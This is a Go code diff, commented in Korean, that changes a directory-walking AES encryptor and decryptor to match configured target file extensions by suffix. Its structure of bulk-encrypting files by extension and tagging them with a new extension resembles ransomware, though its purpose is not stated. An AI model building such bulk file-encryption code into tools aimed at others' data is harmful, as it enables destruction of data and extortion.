@@ -58,8 +58,7 @@ func (c *Client) AESEncryptDirectory(rootPath string) error {
 		} else {
 			for _, extension := range c.config.Extensions.Targets {
 				// 등록된 target 확장자인지 체크.
-				// todo strings.HasSuffix 함수로 비교하는게 더 나을듯
-				if strings.Contains(info.Name(), extension) {
+				if strings.HasSuffix(info.Name(), extension) {
 					//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())
 					// 파일을 암호화
 					if err = encrypt.EncryptFile(path, []byte(c.Key)); err != nil {
@@ -98,7 +97,7 @@ func (c *Client) AESDecryptDirectory(rootPath string) error {
 			return err
 		} else {
 			// NewExt 확장자인데 체크.
-			if strings.Contains(info.Name(), c.config.Extensions.NewExt) {
+			if strings.HasSuffix(info.Name(), c.config.Extensions.NewExt) {
 				//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())
 
 				// 파일 확장자 복호화
